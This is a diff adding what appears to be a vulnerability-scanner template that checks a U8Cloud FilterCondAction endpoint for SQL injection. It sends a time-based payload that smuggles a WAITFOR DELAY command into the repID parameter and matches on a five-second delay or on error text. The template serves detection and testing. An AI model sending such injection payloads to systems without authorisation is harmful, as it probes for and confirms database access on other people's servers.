@@ -1,0 +1,28 @@
+id: u8cloud-filtercondaction-sqli
+
+info:
+  name: U8Cloud FilterCondAction SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL injection vulnerability in U8Cloud FilterCondAction endpoint.
+    Exploitation involves using the WAITFOR DELAY command to test for SQL injection.
+  tags: sqli, u8cloud, injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:5%27--"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SQL syntax error"
+          - "timeout expired"
+          - "unexpected delay"
+        condition: or
+      - type: dsl
+        dsl:
+          - "duration >= 5"
